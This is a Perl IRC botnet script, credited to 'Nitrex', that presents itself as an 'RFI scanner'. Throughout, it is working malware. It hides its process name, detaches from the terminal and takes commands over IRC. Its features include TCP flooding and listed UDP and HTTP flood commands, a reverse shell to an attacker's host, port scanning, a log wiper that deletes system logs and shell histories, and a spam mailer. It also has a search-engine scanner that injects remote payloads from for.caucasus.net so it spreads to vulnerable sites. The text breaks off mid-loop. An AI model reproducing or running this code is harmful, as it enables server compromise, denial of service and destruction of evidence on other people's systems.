#!/usr/bin/perl
#
###############################################
# Powered By Nitrex
#	
#                                                               
# perl RFI SCANNER
#								
#                                 
###############################################


use IO::Socket::INET;
use HTTP::Request;
use LWP::UserAgent;
##################################################
#  Powered By Nitrex
#	
#                                                               
# perl RFI SCANNER
##################################################
my @ps = ("/usr/sbin/ateam","/usr/local/apache/bin/httpd -DSSL","/sbin/syslogd","[eth0]","/sbin/klogd -c 1 -x -x","/usr/sbin/acpid","/usr/sbin/cron","[httpds]","/usr/sbin/httpd","[bash]"); 
$processo = $ps[rand scalar @ps]; 
my $linas_max='10';
my $sleep='3';
my $cmd="http://for.caucasus.net/nit.txt?";
my $id="http://for.caucasus.net/id.txt?";
my $spread="http://for.caucasus.net/nit.txt?";
my $spreads="http://for.caucasus.net/nit.txt?";
my @adms=("Nitrex","Nitrex","Nitrex");
my @canais="#BOT";
##################################################
# Love Is The Best Way Of Suicide
#	
#                                                               
# cLassic RosE
##################################################
my @nickname = ("n1t-in-boTZ",
"nitbot[93]",
    "ylinjaBot[96]",
    "nitbot[49]", 
    "nitbotR[9a79]",
    "nitbot[9a95]",
    "nitbot[2f99]",
    "nitbot[9449]",
    "nitbot[5959]",
    "nitbot[2929]",
    "nitbotz[3949]",
    "nitbotz[9359]",
    "nitbot[3969]", 
    "nitbot[3799]",
    "nitbot[3929]",
    "nitbot[4599]",
    "nitbot[4699]",
    "nitbot[4799]",
    "nitbot[93]",
    "ylinjaBot[96]",
    "nitbot[49]", 
    "nitbotR[79]",
    "nitbot[95]",
    "nitbot[29]",
    "nitbot[449]",
    "nitbot[559]",
    "nitbot[229]",
    "nitbotz[349]",
    "nitbotz[359]",
    "nitbot[369]", 
    "nitbot[379]",
    "nitbot[329]",
    "nitbot[459]",
    "nitbot[469]",
    "nitbot[479]",
    "n1t[3449]",
    "yleBot[3339]",
    "nitbot[2229]",
    "nitbot[1119]", 
    "n1tbot[93]",
    "yl1njaBot[96]",
    "n1tbot[49]", 
    "n1tbotR[79]",
    "n1tbot[95]",
    "n1tbot[29]",
    "n1tbot[449]",
    "n1tbot[559]",
    "n1tbot[229]",
    "n1tbotz[349]",
    "n1tbotz[359]",
    "n1tbot[369]", 
    "n1tbot[379]",
    "n1tbot[329]",
    "n1tbot[459]",
    "n1tbot[469]",
    "n1tbot[479]",
    "n1t[3449]",
    "yleB0t[3339]",
    "n1tbot[2229]",
    "n1tbot[1119]", 
    "n1tR[6669]",
    "n1tR[4889]",
    "n1tR[000]");
my @rname = ("Nitrex");
my $nick = $nickname[rand scalar @nickname];
my $ircname = $nickname[rand scalar @nickname];
my $realname = $rname[rand scalar @rname];
$servidor='sithome.com' unless $servidor;
my $porta='6665';

$SIG{'INT'} = 'IGNORE';
$SIG{'HUP'} = 'IGNORE';
$SIG{'TERM'} = 'IGNORE';
$SIG{'CHLD'} = 'IGNORE';
$SIG{'PS'} = 'IGNORE';
use IO::Socket;
use Socket;
use IO::Select;
chdir("/");
##################################################
# Love Is The Best Way Of Suicide
#	
#                                                               
# cLassic RosE
##################################################

#Connect
$servidor="$ARGV[0]" if $ARGV[0];
$0="$processo"."\0"x16;;
my $pid=fork;
exit if $pid;
die "Masalah fork: $!" unless defined($pid);

our %irc_servers;
our %DCC;
my $dcc_sel = new IO::Select->new();
$sel_cliente = IO::Select->new();
sub sendraw {
  if ($#_ == '1') {
    my $socket = $_[0];
    print $socket "$_[1]\n";
    } else {
    print $IRC_cur_socket "$_[0]\n";
  }
}

sub conectar {
  my $meunick = $_[0];
  my $servidor_con = $_[1];
  my $porta_con = $_[2];
  my $IRC_socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$servidor_con",
  PeerPort=>$porta_con) or return(1);
  if (defined($IRC_socket)) {
    $IRC_cur_socket = $IRC_socket;
    $IRC_socket->autoflush(1);
    $sel_cliente->add($IRC_socket);
    $irc_servers{$IRC_cur_socket}{'host'} = "$servidor_con";
    $irc_servers{$IRC_cur_socket}{'porta'} = "$porta_con";
    $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
    $irc_servers{$IRC_cur_socket}{'meuip'} = $IRC_socket->sockhost;
    nick("$meunick");
    sendraw("USER $ircname ".$IRC_socket->sockhost." $servidor_con :$realname");
    sleep 1;
  }
}

my $line_temp;
while( 1 ) {
  while (!(keys(%irc_servers))) { conectar("$nick", "$servidor", "$porta"); }
  delete($irc_servers{''}) if (defined($irc_servers{''}));
  my @ready = $sel_cliente->can_read(0);
  next unless(@ready);
  foreach $fh (@ready) {
    $IRC_cur_socket = $fh;
    $meunick = $irc_servers{$IRC_cur_socket}{'nick'};
    $nread = sysread($fh, $msg, 4096);
    if ($nread == 0) {
      $sel_cliente->remove($fh);
      $fh->close;
      delete($irc_servers{$fh});
    }
    @lines = split (/\n/, $msg);
    for(my $c=0; $c<= $#lines; $c++) {

      $line = $lines[$c];
      $line=$line_temp.$line if ($line_temp);
      $line_temp='';
      $line =~ s/\r$//;
      unless ($c == $#lines) {
        parse("$line");
        } else {
        if ($#lines == 0) {
          parse("$line");
          } elsif ($lines[$c] =~ /\r$/) {
          parse("$line");
          } elsif ($line =~ /^(\S+) NOTICE AUTH :\*\*\*/) {
          parse("$line"); 
          	   } else {
          	               $line_temp = $line;
        }
      }
    }
  }
}

sub parse {
  my $servarg = shift;
  if ($servarg =~ /^PING \:(.*)/) {
    sendraw("PONG :$1");
    } elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/) {
    my $pn=$1; my $hostmask= $3; my $onde = $4; my $args = $5;
    if ($args =~ /^\001VERSION\001$/) {
      	 notice("$pn", "\001VERSION mIRC v6.17 Mic22\001");
    }
    if (grep {$_ =~ /^\Q$pn\E$/i } @adms ) {
    if ($onde eq "$meunick"){
    shell("$pn", "$args");
  }
  
#End of Connect

##################################################
# Love Is The Best Way Of Suicide
#	
#                                                               
# cLassic RosE
##################################################
#      PREFIX        #
######################
  
  if ($args =~ /^(\Q$meunick\E|\!)\s+(.*)/ ) {
    my $natrix = $1;
    my $arg = $2;
    if ($arg =~ /^\!(.*)/) {
      ircase("$pn","$onde","$1") unless ($natrix eq "!" and $arg =~ /^\!nick/);
      } elsif ($arg =~ /^\@(.*)/) {
      $ondep = $onde;
      $ondep = $pn if $onde eq $meunick;
      bfunc("$ondep","$1");
      } else {
      shell("$onde", "$arg");
    }
  }
}
}
######################
#   End of PREFIX    #
######################

elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i) {
if (lc($1) eq lc($meunick)) {
  $meunick=$4;
  $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
}
} elsif ($servarg =~ m/^\:(.+?)\s+433/i) {
nick("$meunick".int rand(999999));
} elsif ($servarg =~ m/^\:(.+?)\s+001\s+(\S+)\s/i) {
$meunick = $2;
$irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
$irc_servers{$IRC_cur_socket}{'nome'} = "$1";
foreach my $canal (@canais) {
  sendraw("JOIN $canal ddosit");
}
}
}

sub bfunc {
my $printl = $_[0];
my $funcarg = $_[1];
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
  exit;
} else {

######################
#       Help         # 
######################

if ($funcarg =~ /^help/) {
	sendraw($IRC_cur_socket, "PRIVMSG $printl :5[Help] Lets Go, commands are");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :5[Help] ! 7@ddos");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :5[Help] ! 7@scanscan");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :5[Help] ! 7@backconnect");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :5[Help] ! 7@shell");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :5[Help] ! 7@portscanner");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :5[Help] other commands type:");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :5[Help] ! 7@commands");

}

if ($funcarg =~ /^ddos/) {
	sendraw($IRC_cur_socket, "PRIVMSG $printl :13�+=+�Help13�+=+� There are 3 DDossers in this bot");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :13�+=+�Help13�+=+� UDPFlood, HTTPFlood and TCPFlood");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :13�+=+�Help13�+=+� !lol 7@udpflood <ip> <packet size> <time>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :13�+=+�Help13�+=+� !lol 7@tcpflood <ip> <port> <packet size> <time>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :13�+=+�Help13�+=+� !lol 7@httpflood <site> <time>");

}

if ($funcarg =~ /^scanscan/) {
	sendraw($IRC_cur_socket, "PRIVMSG $printl :13�+=+�Help13�+=+� This bot also contains a scan Scanner.");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :13�+=+�Help13�+=+� Commands :");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :13�+=+�Help13�+=+� !lol 7@scan <vuln> <dork>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :13�+=+�Help13�+=+� You can find strings here : http://www.xshqiptaretx.org/strings.txt ");

}

if ($funcarg =~ /^backconnect/) {
	sendraw($IRC_cur_socket, "PRIVMSG $printl :13�+=+�Help13�+=+� You use backconnect like this :");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :13�+=+�Help13�+=+� !lol 7@back <ip><port>");
}

if ($funcarg =~ /^shell/) {
	sendraw($IRC_cur_socket, "PRIVMSG $printl :13�+=+�Help13�+=+� This bot has a integrated shell");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :13�+=+�Help13�+=+� You can use it in private but also public in the channel");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :13�+=+�Help13�+=+� In public channel just use : 7!lol cd tmp12 for example");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :13�+=+�Help13�+=+� For help with the linux commands type :!lol 7@linuxhelp");
}

if ($funcarg =~ /^portscanner/) {
	sendraw($IRC_cur_socket, "PRIVMSG $printl :13�+=+�Help13�+=+� There is a normal portscan and a Nmap:");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :13�+=+�Help13�+=+� !lol 7@portscan <ip>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :13�+=+�Help13�+=+� !lol 7@nmap <ip> <beginport> <endport>");
}

if ($funcarg =~ /^commands/) {
	sendraw($IRC_cur_socket, "PRIVMSG $printl :13�+=+�Help13�+=+� Boz bisa gunain semua perintah enehhhhh :");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :13�+=+�Help13�+=+� !lol 7@portscan <ip>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :13�+=+�Help13�+=+� !lol 7@nmap <ip> <beginport> <endport>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :13�+=+�Help13�+=+� !lol 7@back <ip><port>");	
	sendraw($IRC_cur_socket, "PRIVMSG $printl :13�+=+�Help13�+=+� !lol cd tmp 12 for example");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :13�+=+�Help13�+=+� !lol 7@udpflood <ip> <packet size> <time>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :13�+=+�Help13�+=+� !lol 7@tcpflood <ip> <port> <packet size> <time>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :13�+=+�Help13�+=+� !lol 7@httpflood <site> <time>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :13�+=+�Help13�+=+� !lol 7@linuxhelp");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :13�+=+�Help13�+=+� !lol 7@spread <scan>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :13�+=+�Help13�+=+� !lol 7@scan <vuln> <dork>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :13�+=+�Help13�+=+� !lol 7@system");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :13�+=+�Help13�+=+� !lol 7@logcleaner");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :13�+=+�Help13�+=+� !lol 7@sendmail <subject> <sender> <recipient> <message>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :13�+=+�Help13�+=+� !lol 7@milw0rm");	
	sendraw($IRC_cur_socket, "PRIVMSG $printl :13�+=+�Help13�+=+� !lol 7@join #channel");	
	sendraw($IRC_cur_socket, "PRIVMSG $printl :13�+=+�Help13�+=+� !lol 7@part #channel");
}

if ($funcarg =~ /^linuxhelp/) {
	sendraw($IRC_cur_socket, "PRIVMSG $printl :13�+=+�LinuxHelp13�+=+� - Dir where you are : pwd");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :13�+=+�LinuxHelp13�+=+� - Start a Perl file : perl file.pl");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :13�+=+�LinuxHelp13�+=+� - Go back from dir : cd ..");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :13�+=+�LinuxHelp13�+=+� - Force to Remove a file/dir : rm -rf file/dir;ls -la");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :13�+=+�LinuxHelp13�+=+� - Show all files/dir with permissions : ls -lia");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :13�+=+�LinuxHelp13�+=+� - Find config.inc.php files : find / -type f -name config.inc.php");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :13�+=+�LinuxHelp13�+=+� - Find all writable folders and files : find / -perm -2 -ls");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :13�+=+�LinuxHelp13�+=+� - Find all .htpasswd files : find / -type f -name .htpasswd");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :13�+=+�LinuxHelp13�+=+� - Find all service.pwd files : find / -type f -name service.pwd");
}

######################
#   End of  Help     # 
######################
if ($funcarg =~ /^spread\s+(.*)/) {
$vuln = $1;
sendraw($IRC_cur_socket, "PRIVMSG $printl :13�+=+�Spread Mode13�+=+� Spreading bot on :14 $vuln");
my $shellurl="http://".$vuln.$spread."?";
my $reqz=HTTP::Request->new(GET=>$shellurl);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
sendraw($IRC_cur_socket, "PRIVMSG $printl :13�+=+�Spread Mode13�+=+� Bot is Spreaded on :14 $vuln"); 
}
######################
#     Commands       # 
######################

if ($funcarg =~ /^system/) {
$uname=`uname -a`;$uptime=`uptime`;$ownd=`pwd`;$distro=`cat /etc/issue`;$id=`id`;$un=`uname -sro`;
	sendraw($IRC_cur_socket, "PRIVMSG $printl :13System Info Info BOT : Server : 14Cannot View :14 1337");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :13System Info Uname -a     : 7 $uname");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :13System Info Uptime       : 7 $uptime");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :13System Info Own Prosses  : 7 $processo");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :13System Info ID           : 7 $id");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :13System Info Own Dir      : 7 $ownd");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :13System Info OS           : 7 $distro");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :13System Info Owner        : 7 Nitrex");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :13System Info Channel      : 7 #Nitrex on Allnet");
}

if ($funcarg =~ /^milw0rm/) {
	my @ltt=();
	my @bug=();
	my $x;
	my $page="";
	my $socke = IO::Socket::INET->new(PeerAddr=>"milw0rm.com",PeerPort=>"80",Proto=>"tcp") or return;
	print $socke "GET http://milw0rm.com/rss.php HTTP/1.0\r\nHost: milw0rm.com\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
	my @r = <$socke>;
	$page="@r";
	close($socke);
	while ($page =~  m/<title>(.*)</g){
	$x = $1;
	if ($x =~ /\&lt\;/) {
	$x =~ s/\&lt\;/</g;
	}
	if ($x !~ /milw0rm/) {
	push (@bug,$x);
	}}
	while ($page =~  m/<link.*expl.*([0-9]...)</g) {
	if ($1 !~ m/milw0rm.com|exploits|en/){
	push (@ltt,"http://www.milw0rm.com/exploits/$1 ");
	}}
		sendraw($IRC_cur_socket, "PRIVMSG $printl :5Milw0rm Bugs4 not workin, try later :");
	foreach $x (0..(@ltt - 1)) {
		sendraw($IRC_cur_socket, "PRIVMSG $printl :5Milw0rm Bugs4 $bug[$x] -3 $ltt[$x]");
	sleep 1;
}}
##################################################
# Love Is The Best Way Of Suicide
#	
#                                                               
# cLassic_RosE
##################################################
######################
#      Portscan      # 
######################

if ($funcarg =~ /^portscan (.*)/) {
  my $hostip="$1";
  my
  @portas=("15","19","98","20","21","22","23","25","37","39","42","43","49","53","63","69","79","80","101","106","107","109","110","111","113","115","117","119","135","137","139","143","174","194","389","389","427","443","444","445","464","488","512","513","514","520","540","546","548","565","609","631","636","694","749","750","767","774","783","808","902","988","993","994","995","1005","1025","1033","1066","1079","1080","1109","1433","1434","1512","2049","2105","2432","2583","3128","3306","4321","5000","5222","5223","5269","5555","6660","6661","6662","6663","6665","6666","6667","6668","6669","7000","7001","7741","8000","8018","8080","8200","10000","19150","27374","31310","33133","33733","55555");
  my (@aberta, %porta_banner);
  sendraw($IRC_cur_socket, "PRIVMSG $printl :(5PortScan) 6Loading port scanner 7(wait a minute, ok !!)  12".$1." Lets Go!! .");
  foreach my $porta (@portas)  {
    my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $porta, Proto =>
    'tcp', Timeout => 4);
    if ($scansock) {
      push (@aberta, $porta);
      $scansock->close;
    }
  }
  
  if (@aberta) {
    sendraw($IRC_cur_socket, "PRIVMSG $printl :13�+=+�PortScan13�+=+� 6open ports are...:5 @aberta");
    } else {
    sendraw($IRC_cur_socket, "PRIVMSG $printl :13�+=+�PortScan13�+=+� 6all ports are closed");
  }
}

######################
#  End of  Portscan  # 
######################
##################################################
# Love Is The Best Way Of Suicide
#	
#                                                               
# cLassic RosE
##################################################
######################
#        Nmap        #  
######################
   if ($funcarg =~ /^nmap\s+(.*)\s+(\d+)\s+(\d+)/){
         my $hostip="$1";
         my $portstart = "$2";
         my $portend = "$3";
         my (@abertas, %porta_banner); 
       sendraw($IRC_cur_socket, "PRIVMSG $printl :13�+=+�Nmap13�+=+� :12 $1 (13�+=+�Port13�+=+�) 12 $2-$3");
       foreach my $porta ($portstart..$portend){
               my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $porta, Proto => 'tcp', Timeout => $portime); 
    if ($scansock) {
                 push (@abertas, $porta);
                 $scansock->close;
                 if ($xstats){
        sendraw($IRC_cur_socket, "PRIVMSG $printl :13�+=+�Nmap13�+=+� Founded 12 $porta"."/Open"); 
                 }
               }
             }
             if (@abertas) {
        sendraw($IRC_cur_socket, "PRIVMSG $printl :13�+=+�Nmap13�+=+� Complete ");
             } else {
        sendraw($IRC_cur_socket, "PRIVMSG $printl :13�+=+�Nmap13�+=+� No open ports have been founded 13");
             }
			 }
######################
#    End of Nmap     #  
######################
##################################################
# Love Is The Best Way Of Suicide
#	
#                                                               
# cLassic RosE
##################################################
######################
#    Log Cleaner     #  
######################
if ($funcarg =~ /^logcleaner/) {
sendraw($IRC_cur_socket, "PRIVMSG $printl :13cleaning!!! it takes a couple of minutes..."); 
    system 'rm -rf /var/log/lastlog';
    system 'rm -rf /var/log/wtmp';
	system 'rm -rf /etc/wtmp';
	system 'rm -rf /var/run/utmp';
	system 'rm -rf /etc/utmp';
	system 'rm -rf /var/log';
	system 'rm -rf /var/logs';
	system 'rm -rf /var/adm';
	system 'rm -rf /var/apache/log';
	system 'rm -rf /var/apache/logs';
	system 'rm -rf /usr/local/apache/log'; 
	system 'rm -rf /usr/local/apache/logs';
	system 'rm -rf /root/.bash_history';
	system 'rm -rf /root/.ksh_history';
sendraw($IRC_cur_socket, "PRIVMSG $printl :13LogCleaner 4log files are clear"); 
		sleep 1;
sendraw($IRC_cur_socket, "PRIVMSG $printl :13LogCleaner 4cleaning the machine log files");
	system 'find / -name *.bash_history -exec rm -rf {} \;';
	system 'find / -name *.bash_logout -exec rm -rf {} \;';
	system 'find / -name "log*" -exec rm -rf {} \;';
	system 'find / -name *.log -exec rm -rf {} \;';
		sleep 1;
sendraw($IRC_cur_socket, "PRIVMSG $printl :13LogCleaner 4done! logs are clear"); 
      }
######################
# End of Log Cleaner #  
######################
##################################################
# Love Is The Best Way Of Suicide
#	
#                                                               
# cLassic RosE
##################################################
######################
#       MAILER       #  
######################
# For mailing use :
# !lol @sendmail <subject> <sender> <recipient> <message>
#
######################
if ($funcarg =~ /^sendmail\s+(.*)\s+(.*)\s+(.*)\s+(.*)/) {
sendraw($IRC_cur_socket, "PRIVMSG $printl :13�+=+�Mailer13�+=+� Try Sending Mail to :10 $3");
$subject = $1;
$sender = $2;
$recipient = $3; 
@corpo = $4;
$mailtype = "content-type: text/html";
$sendmail = '/usr/sbin/sendmail';
open (SENDMAIL, "| $sendmail -t");
print SENDMAIL "$mailtype\n";
print SENDMAIL "Subject: $subject\n"; 
print SENDMAIL "From: $sender\n";
print SENDMAIL "To: $recipient\n\n";
print SENDMAIL "@corpo\n\n";
close (SENDMAIL);
sendraw($IRC_cur_socket, "PRIVMSG $printl :13�+=+�Mailer13�+=+� Successfully Sended to :10 $recipient"); 
}
######################
#   End of MAILER    #  
######################
######################
#  Join And Part     # 
######################
           if ($funcarg =~ /^join (.*)/) {
              sendraw($IRC_cur_socket, "JOIN ".$1);
           }
           if ($funcarg =~ /^part (.*)/) {
              sendraw($IRC_cur_socket, "PART ".$1);
           }
		   
######################
#End of Join And Part# 
######################
##################################################
# Love Is The Best Way Of Suicide
#	
#                                                               
# cLassic RosE
##################################################
######################
#     TCPFlood       # 
######################

if ($funcarg =~ /^tcpflood\s+(.*)\s+(\d+)\s+(\d+)/) {
  sendraw($IRC_cur_socket, "PRIVMSG $printl :13�+=+�TCP DDoS13�+=+� Attacking 12 ".$1.":".$2." for 12 ".$3." seconds.");
  my $itime = time;
  my ($cur_time);
  $cur_time = time - $itime;
  while ($3>$cur_time){
  $cur_time = time - $itime;
  &tcpflooder("$1","$2","$3");
}
sendraw($IRC_cur_socket,"PRIVMSG $printl :13�+=+�TCP DDoS13�+=+� Mission Accomplished.. 12 ".$1.":".$2.".");
}
######################
#  End of TCPFlood   # 
######################
##################################################
# Love Is The Best Way Of Suicide
#	
#                                                               
# cLassic RosE
##################################################
######################
#   Back Connect     # 
######################
if ($funcarg =~ /^back\s+(.*)\s+(\d+)/) {
my $host = "$1";
my $porta = "$2";
my $proto = getprotobyname('tcp');
my $iaddr = inet_aton($host);
my $paddr = sockaddr_in($porta, $iaddr);
my $shell = "/bin/sh -i";
if ($^O eq "MSWin32") {
  $shell = "cmd.exe";
}
socket(SOCKET, PF_INET, SOCK_STREAM, $proto) or die "socket: $!";
connect(SOCKET, $paddr) or die "connect: $!";
open(STDIN, ">&SOCKET");
open(STDOUT, ">&SOCKET");
open(STDERR, ">&SOCKET");
system("$shell");
close(STDIN);
close(STDOUT);
close(STDERR);
if ($estatisticas)
{
  sendraw($IRC_cur_socket, "PRIVMSG $printl :13�+=+�BackConnect13�+=+� Connecting to 12 $host:$porta");
}
}
######################
#End of  Back Connect# 
##################################################
# Love Is The Best Way Of Suicide
#	
#                                                               
# cLassic RosE
##################################################
#   EExPreSi SCANNER # 
######################
######################################################################
#################### GOOGLE
######################################################################
if ($funcarg =~ /^scan\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $dork=$2;
my $contatore=0;
my %hosts;
### Start Message
  sendraw($IRC_cur_socket, "PRIVMSG $printl :5START Scanning 13Bug:4 $bug 13Dork:4 $dork");
### End of Start Message
# Starting The Search Engine
	my @google=&googlet($dork);
#
push(my @tot, @google);
#
my @puliti=&unici(@tot);
  sendraw($IRC_cur_socket, "PRIVMSG $printl :5[+]6 ".scalar(@tot)." 4-6 ".scalar(@puliti)." 4-6 $dork ");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){
sendraw($IRC_cur_socket, "PRIVMSG $printl :5[~]6 ".$contatore." 4-6 ".$uni. " "); 
}
if ($contatore==$uni-1){
  sendraw($IRC_cur_socket, "PRIVMSG $printl :5[F]4 $dork");
}
### Print CMD and TEST CMD###
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$cmd."?";
### End of Print CMD and TEST CMD###
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /Mic22/ && $re =~ /uid=/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
  sendraw($IRC_cur_socket, "PRIVMSG $printl :4[Safe OFF] 5 [Uname: $un] [HDD: Free ($free) Used ($used) Total ($all) $type EXPLOITING:4 $print ");
  sendraw($IRC_cur_socket, "PRIVMSG Nitrex :Uname:6 $type Vuln:10 $print");
my $test2="http://".$sito.$bug.$spread."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
my $ding="http://".$sito.$bug."http://for.caucasus.net/pbot.txt?";
my $dong=HTTP::Request->new(GET=>$ding);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($dong);
}}
elsif($re =~ /Mic22/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
  sendraw($IRC_cur_socket, "PRIVMSG $printl :4[Safe ON] 5 [Uname: $un] [HDD: Free ($free) Used ($used) Total ($all) $type EXPLOITING:4 $print ");
my $test2="http://".$sito.$bug.$spreads."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
}}
}}}
exit;
}}

######################################################################
#################### AllTheWeb
######################################################################
if ($funcarg =~ /^scan\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $dork=$2;
my $contatore=0;
my %hosts;
# Starting The Search Engine
	my @alltheweb=&allthewebt($dork);
	my @allweb=&standard($dork);
#
push(my @tot, @alltheweb, @allweb);
#
my @puliti=&unici(@tot);
  sendraw($IRC_cur_socket, "PRIVMSG $printl :5[+]6 ".scalar(@tot)." 4-6 ".scalar(@puliti)." 4- $dork ");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){
sendraw($IRC_cur_socket, "PRIVMSG $printl :5[~]6 ".$contatore." 4-6 ".$uni." "); 
}
if ($contatore==$uni-1){
  sendraw($IRC_cur_socket, "PRIVMSG $printl :5[F]4 $dork");
}
### Print CMD and TEST CMD###
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$cmd."?";
### End of Print CMD and TEST CMD###
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /Mic22/ && $re =~ /uid=/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
  sendraw($IRC_cur_socket, "PRIVMSG $printl :4[Safe OFF] 5 [Uname: $un] [HDD: Free ($free) Used ($used) Total ($all) $type EXPLOITING:4 $print ");
  sendraw($IRC_cur_socket, "PRIVMSG Nitrex :Uname:6 $type Vuln:10 $print");
my $test2="http://".$sito.$bug.$spread."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
my $ding="http://".$sito.$bug."http://for.caucasus.net/pbot.txt?";
my $dong=HTTP::Request->new(GET=>$ding);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($dong);
}}
elsif($re =~ /Mic22/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
  sendraw($IRC_cur_socket, "PRIVMSG $printl :4[Safe ON] 5 [Uname: $un] [HDD: Free ($free) Used ($used) Total ($all) $type EXPLOITING:4 $print ");
my $test2="http://".$sito.$bug.$spreads."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
}}
}}}
exit;
}}

######################################################################
#################### LYCOS
######################################################################
if ($funcarg =~ /^scan\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $dork=$2;
my $contatore=0;
my %hosts;
# Starting The Search Engine
	my @lylist=&lycos($dork);
push(my @lybyp,@lylist);
#
push(my @tot, @lybyp);
my @puliti=&unici(@tot);
  sendraw($IRC_cur_socket, "PRIVMSG $printl :5[+]6 ".scalar(@tot)." 4-6 ".scalar(@puliti)." 4-6 $dork ");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){
sendraw($IRC_cur_socket, "PRIVMSG $printl :5[~]6 ".$contatore." 5-6 ".$uni." "); 
}
if ($contatore==$uni-1){
  sendraw($IRC_cur_socket, "PRIVMSG $printl :5[F]4 $dork");
}
### Print CMD and TEST CMD###
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$cmd."?";
### End of Print CMD and TEST CMD###
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /Mic22/ && $re =~ /uid=/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
